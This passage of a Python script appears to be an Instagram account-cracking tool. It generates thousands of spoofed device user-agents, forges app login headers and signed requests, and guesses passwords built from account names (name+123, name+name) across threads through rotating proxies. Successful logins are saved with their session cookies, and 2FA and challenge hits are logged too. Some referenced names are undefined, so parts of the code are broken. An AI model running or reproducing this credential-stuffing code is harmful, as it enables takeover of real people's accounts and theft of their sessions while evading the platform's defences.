S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
son = ['H8324', 'H8314', 'SO-05K','XQ-AU51', 'XQ-AU52','XQ-AT51', 'XQ-AT52', 'SOG01','SO-52A', 'XQ-AS52', 'XQ-AS62', 'XQ-AS72', 'A002SO, SOG02']
rot = ['HUAWEIMYA-L03', 'HUAWEIMYA-L23', 'HUAWEIMYA-L02', 'HUAWEIMYA-L22', 'HUAWEIMYA-U29', 'HUAWEIMYA-L13']

LANGUAGES = ["en_US"]
net = random.choice(['281','282','283','284','285','286','287','288','289','290','291','292','293','382','383','370','394','301','310','311','319','350','378','360','344'])          
noti = random.choice(['9','10','11','12'])
fbbv = str(random.randint(111111111,999999999))
fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
  
  

  
# مولد User-Agent ديناميكي
ugen = []
ugen2 = []
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,115)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for xd in range(1000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
    c='RMX3491 Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(10,200)
    e='0'
    f=random.randrange(1000,8000)
    g=random.randrange(10,200)
    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
    ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Symbian/55; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaX7-00'
    e=random.randrange(100, 9999)
    f='/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/533.4'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    aa='Mozilla/5.0 (Linux; Android 8.1.0)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' GT-S5830L'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for ua in range(1000):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S5380D'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/2.0; ru-ru) AppleWebKit/534.20 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile HVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
    
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(uaku2)

# Instagram App User-Agentن
tazz = f'[FBAN/Instagram;FBAV/{net}.0.0.21.117;FBPN/com.instagram.android;FBLC/en_US;FBBV/{fbbv};FBCR/null;FBMF/TECNO;FBBD/TECNO;FBDV/{random.choice(poc)};FBSV/12;FBCA/arm64-v8a;FBDM/{{density=2.75,width=1080,height=2216}};FBOP/1;]'
ugm = f"[FBAN/Instagram;FBAV/{net}.0.0.77.46;FBBV/251145743;FBDM/{{density=2.625,width=1080,height=1920}};FBLC/pt_BR;FBRV/{str(random.randint(000000000, 999999999))};FBCR/Zong;FBMF/Samsung;FBBD/Samsung;FBPN/com.instagram.android;FBDV/{random.choice(samsung)};FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]"

# دالة جلب User-Agent من ملف خارجيتhh
def uaku(self):
    try:
        ua = open('bbnew.txt', 'r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a = requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua = open('bbnew.txt', 'w')
        aa = re.findall('line">(.*?)<', str(a))
        for un in aa:
            ua.write(un + '\n')
        ua = open('bbnew.txt', 'r').read().splitlines()

# دالة urllib للتوافق
try:
    urllib_quote_plus = urllib.quote
except:
    urllib_quote_plus = urllib.parse.quote_plus

# تعريف الكلاس Instagram

# تهيئة colorama
init(autoreset=True)

# تعريف المتغيرات العامة
insta_log = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
internal, success, checkpoint, loop = [], [], [], 0
internal, external, success, checkpoint, loop = [], [], [], [], 0
# كلاس UserAgent لتوليد User-Agent مخصص لتونس

class DeviceAgentGenerator:
    def __init__(self):
        self.kode_list = ['145652090', '206670917', '185203686', '192992561', '183982986', '206670927', '150338061',
        '240726452', '239490551', '239490548', '240726426', '240726476', '240726491']
        self.kode = random.choice(self.kode_list)
        self.devices = [
            {"brand": "Huawei", "model": "Nova 5T", "code": "YAL-L21", "chip": "kirin980", "dpi": "360dpi", "res": "720x1600", "android": "29/10"},
            {"brand": "Samsung", "model": "Galaxy Note 20", "code": "c1q", "chip": "exynos990", "dpi": "480dpi", "res": "1080x2340", "android": "28/9"},
            {"brand": "Xiaomi", "model": "Redmi 9T", "code": "joyeuse", "chip": "qcom", "dpi": "420dpi", "res": "1080x2400", "android": "30/11"},
            {"brand": "Huawei", "model": "P30 Lite", "code": "MAR-LX1", "chip": "kirin710", "dpi": "360dpi", "res": "720x1600", "android": "29/10"},
            {"brand": "Samsung", "model": "Galaxy A51", "code": "a51", "chip": "exynos9611", "dpi": "480dpi", "res": "1080x2340", "android": "28/9"},
            {"brand": "OnePlus", "model": "OnePlus 7", "code": "hotdog", "chip": "qcom", "dpi": "420dpi", "res": "1080x2400", "android": "30/11"},
        ]
        self.versions = [v.strip() for v in "396.0.0.46.242, 397.0.0.0.61, 393.1.0.50.76, 394.0.0.46.81, 387.1.0.34.85, 392.2.0.58.78, 381.2.0.53.84".split(",")]

    def instagram_app(self):
        device = random.choice(self.devices)
        version = random.choice(self.versions)
        ua_template = "Instagram {version} Android ({android}; {dpi}; {res}; {brand}; {model}; {code}; {chip}; fr_TN; {kode})"
        return ua_template.format(
            version=version,
            android=device["android"],
            dpi=device["dpi"],
            res=device["res"],
            brand=device["brand"],
            model=device["model"],
            code=device["code"],
            chip=device["chip"],
            kode=self.kode
        )

#ارسلي انستا







class UserAgent:
    def __init__(self):
        self.kode_list = ['145652090', '206670917', '185203686', '192992561', '183982986', '206670927', '150338061',
        '240726452', '239490551', '239490548', '240726426', '240726476', '240726491']
        self.kode = random.choice(self.kode_list)
        self.devices = [
            {"brand": "Samsung", "model": "Galaxy Note 20", "code": "c1q", "chip": "exynos990", "dpi": "480dpi", "res": "1080x2340", "android": "28/9"},
            {"brand": "Samsung", "model": "Galaxy A51", "code": "a51", "chip": "exynos9611", "dpi": "480dpi", "res": "1080x2340", "android": "28/9"},
        ]
        self.versions = [v.strip() for v in "401.0.0.48.79".split(",")]

    def instagram_app(self):
        device = random.choice(self.devices)
        version = random.choice(self.versions)
        ua_template = "Instagram {version} Android ({android}; {dpi}; {res}; {brand}; {model}; {code}; {chip}; fr_TN; {kode})"
        return ua_template.format(
            version=version,
            android=device["android"],
            dpi=device["dpi"],
            res=device["res"],
            brand=device["brand"],
            model=device["model"],
            code=device["code"],
            chip=device["chip"],
            kode=self.kode
        )


# قوالب User-Agent لجلب التوكنات بإصدار ثابت
TOKEN_USER_AGENT_TEMPLATES = [
    "Instagram {} Android (30/11; 480dpi; 1080x2400; samsung; SM-G998B; z3q; samsungexynos2100; fr_FR; {})",
]

def generate_build_number():
    """توليد رقم بناء عشوائي."""
    return str(random.randint(3000000, 4000000))

def get_token_user_agent():
    """توليد User-Agent بإصدار Instagram ثابت."""
    version = "70.0.0.15.98"
    return random.choice(TOKEN_USER_AGENT_TEMPLATES).format(version, generate_build_number())

def fetch_instagram_tokens():
    """إرجاع csrftoken و mid ثابتين."""
    csrftoken = "4Snt7wv6cy63DiRdEWMDhmXNalfU1JFQ"
    mid = "aLl_PAABAAFwlaj1DhlGbSH9wr4D"
    return csrftoken, mid

class Helper:
    def get_random_block_id(self):
        block_ids = [
            'edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965',
            'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
            '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
            '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf'
        ]
        return random.choice(block_ids)

    def generate_android_id(self, user, passwd):
        try:
            return hashlib.md5((user + passwd).encode()).hexdigest()[:16]
        except Exception as e:
            print(f"{Fore.RED}[!] Error generating android_id: {str(e)}{Style.RESET_ALL}")
            return ''.join(random.choices('0123456789abcdef', k=16))

    def get_timezone_offset(self):
        return 3600  # Tunisia UTC+1

    def UseNet(self):
        return ("WIFI", "WIFI")

    def get_random_machine_id(self):
        return base64.b64encode(os.urandom(16)).decode('utf-8').rstrip('==')

#::

        
class Instagram:
    LANGUAGES = ["fr_TN"]

    def __init__(self):
        self.s = requests.Session()
        self.helper = Helper()
     
        self.csrf_token = None
        self.mid = None
        self.initialize_session()
        self.ext = []
        self.s = requests.Session()
        uaku(self)  # جلب User-Agent من ملف خارجي عند التهيئة
        self.accounts = []
        self.success_count = 0
        self.challenge_count = 0
        self.two_factor_count = 0
        self.failure_count = 0
        self.results = []
        self.csrftoken = "random_csrf_token_" + uuid.uuid4().hex[:8]
        self.mid = uuid.uuid4().hex
        self.loop_count = 0

    def fetch_random_id(self):
        block_ids = [
            'edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965',
            'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
            '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
            '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf'
        ]
        return random.choice(block_ids)

    def import_accounts(self, filepath):
        if not os.path.isfile(filepath):
            console.print(f"[red]File not found: {filepath}[/red]")
            return
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line or '|' not in line:
                    continue
                username, password = line.split('|', 1)
                username = username.strip()
                password = password.strip()
                if username and password:
                    self.accounts.append(f"{username}|{password}")
        console.print(f"[green]Loaded {len(self.accounts)} accounts for checking.[/green]")
##:--🆕تت
##:--🆕
    def launch_attack(self):
        import random  # إضافة مكتبة random لخلط كلمات المرور
        idtar = f'# [•] Users: {len(self.accounts)} [•]'
        idtar1 = Text(idtar, style='yellow')
        console.print(idtar1)
        io = f'[•] ATTACK brute force'
        oi = Text(io, style='cyan')
        console.print(oi, justify='center')
        with ThreadPoolExecutor(max_workers=30) as pool:
            futures = []
            for yuzong in self.accounts:
                try:
                    idf = yuzong.split('|')[0].strip()
                    nmf = yuzong.split('|')[1].lower()
                    frs = nmf.split(' ')[0]
                    pwv = []
                    if len(nmf) < 6:
                        if len(frs) < 3:
                            continue
                        else:
                            pwv.append(nmf)
                    elif len(frs) < 3:
                        pwv.append(nmf)
                    else:

                        pwv.append(frs + '123')
                        pwv.append(frs + frs)
                    random.shuffle(pwv)  # خلط قائمة كلمات المرورh بشكل عشوائي
                    futures.append(pool.submit(self.attempt_login, idf, pwv))
                except:
                    pass
            with Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TaskProgressColumn(),
                TimeElapsedColumn()
            ) as progress:
                task = progress.add_task("[cyan]Checking accounts...", total=len(self.accounts))
                for _ in as_completed(futures):
                    self.loop_count += 1
                    progress.update(task, advance=1)
                    console.print(
                        f'{B2}[{H2}+{B2}] Checking: {H2}{self.loop_count}{P2}/{H2}{len(self.accounts)} {P2}| Success: {H2}{self.success_count} {P2}| Challenge: {K2}{self.challenge_count} {P2}| 2FA: {M2}{self.two_factor_count} {P2}| Failed: {M2}{self.failure_count}',
                        end='\r'
                    )
        console.print('\n')
        oi = '# CRACK COMPLETED'
        io = Text(oi, style='yellow')
        console.print(io)
        self.display_report()
    def attempt_login(self, username, passwords):
        session = requests.Session()
        user_agent = UserAgent().instagram_app()
        device_id = f"android-{uuid.uuid4().hex[:16]}"
        guid = uuid.uuid4().hex
        adid = uuid.uuid4().hex
        headers = {
            'User-Agent': user_agent,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'X-IG-App-ID': '1217981644879628',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-Locale': 'en_US',
            'X-IG-Device-Locale': 'en_US',
            'X-IG-Mapped-Locale': 'en_US',
            'X-IG-Connection-Speed': f"{random.randint(2000, 5000)}kbps",
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Pigeon-Session-Id': uuid.uuid4().hex,
            'X-Pigeon-Rawclienttime': f"{time.time():.3f}",
            'X-Bloks-Version-Id': self.fetch_random_id(),
            'X-FB-HTTP-Engine': 'Liger',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cookie': f'mid={self.mid}; csrftoken={self.csrftoken}',
        }
        for password in passwords:
            timestamp = int(time.time())
            payload = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM:0:{timestamp}:{password}',
                'device_id': device_id,
                'guid': guid,
                'adid': adid,
                'phone_id': uuid.uuid4().hex,
                'google_tokens': '[]',
                'login_attempt_count': '0',
                'country_codes': '[{"country_code":"1","source":"default"}]',
                'jazoest': f"2{random.randint(1000, 9999)}",
                '_csrftoken': self.csrftoken
            }
            signed_body = hmac.new(SIG_KEY, json.dumps(payload).encode('utf-8'), hashlib.sha256).hexdigest() + '.' + json.dumps(payload)
            data = {
                'signed_body': signed_body,
                'ig_sig_key_version': '4'
            }
            try:
                response = session.post(
                    'https://i.instagram.com/api/v1/accounts/login/',
                    headers=headers,
                    data=data,
                    timeout=10
                )
                text = response.text
                result = {
                    'username': username,
                    'password': password,
                    'status': None,
                    'user_agent': user_agent,
                    'http_status': response.status_code
                }
                if 'logged_in_user' in text:
                    self.success_count += 1
                    result['status'] = 'Success'
                    cookie = ';'.join([f'{k}={v}' for k, v in session.cookies.get_dict().items()])
                    msg = f"\n\n{H2} ~𖣘────────────━﴾𖤍-Success-𖤍﴿━─────────────𖣘~~~  \n\n"
                    msg += f"{P2}   ➪ {H2}Username{P2}: {B2}{username} {P2}| {H2}Password{P2}: {B2}{password}\n{P2}   ➪ {H2}Cookies{P2}: {A2}{cookie}"
                    msg += f"\n{P2}   ➪ {H2}Success{P2}: {B2}{self.success_count}\n{P2}   ➪ {H2}Device{P2}: {A2}{user_agent}\n\n{H2} ~𖣘─────────────━﴾𓆩-Good-𓆪﴿━─────────────𖣘~~  \n\n"
                    console.print(msg)
                    with open('result/success_accounts.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{username} | {password}\n{cookie}\n\n')
                elif 'two_factor_required' in text:
                    self.two_factor_count += 1
                    result['status'] = '2FA Required'
                    console.print(f"\n{M2}         𖣘─────────────────━﴾𓆩2FA Required𓆪﴿━─────────────────𖣘            \n{M2}           ├ {username} | {password}\n{M2}           ├ 2FA: {B2} {self.two_factor_count}")
                    console.print(f"{M2}           ├ Device: {H2}{user_agent}\n {J2}         𖣘─────────────────━﴾𓆩Good𓆪﴿━─────────────────𖣘            \n √√√√√√√√✓")
                elif 'challenge_required' in text:
                    self.challenge_count += 1
                    result['status'] = 'Challenge Required'
                    console.print(f"\n{K2} ~𖣘────────────━﴾𖤍-Challenge-𖤍﴿━─────────────𖣘~~~  \n\n"
                                  f"{P2}   ➪ {K2}Username{P2}: {B2}{username} {P2}| {K2}Password{P2}: {B2}{password}"
                                  f"\n{P2}   ➪ {K2}Challenge{P2}: {B2}{self.challenge_count}\n{P2}   ➪ {K2}Device{P2}: {A2}{user_agent}\n\n{K2} ~𖣘─────────────━﴾𓆩-Good-𓆪﴿━─────────────𖣘~~  \n\n")
                    with open('result/challenge_accounts.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{username} | {password} | {user_agent}\n\n')
                elif response.status_code == 429:
                    self.failure_count += 1
                    result['status'] = 'Rate Limit'
                    console.print(f"[yellow]Rate limit detected for {username} | {password}: HTTP 429[/yellow]")
                else:
                    self.failure_count += 1
                    result['status'] = 'Failed'
                    console.print(f"[yellow]Login failed for {username} | {password}: HTTP {response.status_code} - {text[:100]}...[/yellow]")
                self.results.append(result)
            except Exception as e:
                self.failure_count += 1
                result['status'] = 'Error'
                result['details'] = str(e)
                console.print(f"[red]Error checking {username} | {password}: {str(e)}[/red]")
                self.results.append(result)
        session.close()


    def display_report(self):
        total = len(self.accounts)
        console.print(f"\n{H2}𖣘══════════════━﴾𓆩 Final Report 𓆪﴿━══════════════𖣘")
        console.print(f"{P2}   ➪ {H2}Total Accounts{P2}: {B2}{total}")
        console.print(f"{P2}   ➪ {H2}Success{P2}: {B2}{self.success_count}")
        console.print(f"{P2}   ➪ {K2}Challenge{P2}: {B2}{self.challenge_count}")
        console.print(f"{P2}   ➪ {M2}2FA{P2}: {B2}{self.two_factor_count}")
        console.print(f"{P2}   ➪ {M2}Failed{P2}: {B2}{self.failure_count}")
        console.print(f"{P2}   ➪ {H2}Success Rate{P2}: {B2}{(self.success_count / total * 100):.2f}%")
        console.print(f"{H2}𖣘══════════════━﴾𓆩 XD 𓆪﴿━══════════════𖣘\n")
        
    def clear(self):
        os.system('clear')

    def banner(self):

        wel = '#   B̸r̸u̸t̸e̸ F͎o͎r͎c͎e͎ '
        wel2 = mark(wel, style='magenta')
        sol().print(wel2)
        au = '                :  '
        pengembang1 = nel(au, style="green")
        cetak(nel(pengembang1, title='𝚉𝚎𝚛<𝚘 𝚃𝚛𝚊𝚌𝚎'))

    def read_input_file1(self, file_path):
        global internal
        try:
            with open(file_path, 'r') as file:
                lines = file.readlines()
                for line in lines:
                    line = line.strip()
                    if line:
                        internal.append(line)
        except FileNotFoundError:
            print(f"[ERROR]   ماتعرفش تكتب مسار ملف")
            exit()
        except Exception as e:
            print(f"[ERROR]   ماتعرفش تكتب مسار ملف")
            exit()
#@''!🆕hh
    def passwrd1(self):
        idtar = f'# [•] 𝚄𝚜𝚎𝚛𝚜  : {len(internal)} [•]'
        idtar1 = mark(idtar, style='yellow')
        sol().print(idtar1) 
        io = f'[•] 𝙰𝚃𝚃𝙰𝙲𝙺 𝚋𝚛𝚞𝚝𝚎 𝚏𝚘𝚛𝚎'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title=' 𝚋𝚛𝚞𝚝𝚎 𝚏𝚘𝚛𝚎 '))  
        with tred(max_workers=9 ) as pool:
            for yuzong in internal:
                try:
                    idf = yuzong.split('|')[0].strip()
                    nmf = yuzong.split('|')[1].lower()
                    frs = nmf.split(' ')[0]
                    pwv = []
                    if len(nmf) < 6:
                        if len(frs) < 3:
                            continue
                        else:
                            pwv.append(nmf)
                    elif len(frs) < 3:
                        pwv.append(nmf)
                    else:

                        pwv.append(frs + '11')
                        pwv.append(frs + '12')
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '123456')
                        pwv.append(frs + '1234567')
                        pwv.append(frs + '12345678')
                        pwv.append(frs + '123456789')
                        pwv.append(frs + '@123')
                        pwv.append(frs + '#123')
                        pwv.append(frs + '123123')
                        pwv.append(frs + frs + '123')
                        pwv.append(frs + frs)
                    pool.submit(self.crackAPI1, idf, pwv)
                except:
                    pass
        print('\n')
        oi = '# CRACK SELESAI'
        io = mark(oi, style='yellow')
        sol().print(io)
        exit()

    def crackAPI1(self, user, pas):
        global loop, success, checkpoint
        sys.stdout.write(f"\r{CY}┣{C}[ 𝚉𝚎𝚛𝚘-𝚃𝚛𝚊𝚌𝚎 ] [{K}{loop}/{len(internal)}{C}] {H}[OK:{len(success)}]{C} {K}[CP:{len(checkpoint)}]{C} {O}[{loop/len(internal):.0%}]{C}"), sys.stdout.flush()
        for pw in pas:
            try:
                s = requests.Session()
                ts = calendar.timegm(current_GMT)
                nip = random.choice(prox)
                proxs = {'http': 'socks4://' + nip}
                ua = random.choice(ugen + ugen2 + [tazz, ugm])
                token = s.get('https://www.instagram.com/accounts/login/?next=%2Fapi%2Fv1%2Fweb%2Ffxcal%2Fig_sso_users%2F', timeout=20)
                koki = ";".join([f"{key}={value}" for key, value in token.cookies.get_dict().items()])
                koki += '; m_pixel_ratio=2.625; wd=412x756'
                headers = {
                    'Host': 'www.instagram.com',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '1005633336-hot',
                    'content-type': 'application/x-www-form-urlencoded',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'x-requested-with': 'XMLHttpRequest',
                    'x-asbd-id': '198387',
                    'user-agent': ua,
                    'x-csrftoken': token.cookies.get('csrftoken', ''),
                    'x-ig-app-id': '1217981644879628',
                    'origin': 'https://www.instagram.com',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.instagram.com/accounts/login/?next=%2Fapi%2Fv1%2Fweb%2Ffxcal%2Fig_sso_users%2F',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': random.choice(LANGUAGES)
                }
                param = {
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"
                }
                x = s.post(insta_log1, headers=headers, data=param, proxies=proxs, timeout=20)
                x_jason = json.loads(x.text)

                
                if "userId" in str(x_jason) or "logged_in_user" in str(x_jason):
                    cookies = s.cookies.get_dict()
                    cookies_str = '; '.join([f"{key}={value}" for key, value in cookies.items()])
                    io = f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nCookies  : {cookies_str}'
                    oi = nel(io, style='green')
                    print('\n')
                    cetak(nel(oi, title=' OK-YES'))
                    with open('result/success_accounts.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{user}|{pw}|{cookies_str}\n\n')
                    success.append(user)
                    s.close()
                    break
                elif isinstance(x_jason, dict) and x_jason.get("status") == "fail" and str(x_jason.get("checkpoint_url", "")).startswith("/auth_platform/"):
                    checkpoint.append(user)
                    io = f'Username : {user}\nPassword : {pw}'
                    oi = nel(io, style='yellow')
                    print('\n')
                    cetak(nel(oi, title=' CP-NO'))
                    with open('result/challenge_accounts.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{user}|{pw}| \n\n')
                    s.close()
                    break
                s.close()
            except:
                continue
        loop += 1
        
    def initialize_session(self):
        for _ in range(3):
            try:
                self.csrf_token, self.mid = fetch_instagram_tokens()
                if self.csrf_token and self.mid:
                    print(f"{Fore.GREEN}[+] Successfully fetched tokens: csrf_token={self.csrf_token}, mid={self.mid}{Style.RESET_ALL}")
                    return
                print(f"{Fore.YELLOW}[!] Failed to fetch tokens, retrying...{Style.RESET_ALL}")
                time.sleep(1)
            except Exception as e:
                print(f"{Fore.RED}[!] Error initializing session: {str(e)}{Style.RESET_ALL}")
                time.sleep(1)
        print(f"{Fore.RED}[!] Failed to fetch tokens after retries, exiting...{Style.RESET_ALL}")
        exit()

    def clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def banner(self):
        self.clear()
        print(f"     {Fore.CYAN}{Style.BRIGHT}    ┌───────────────────────────────┐{Style.RESET_ALL} ")
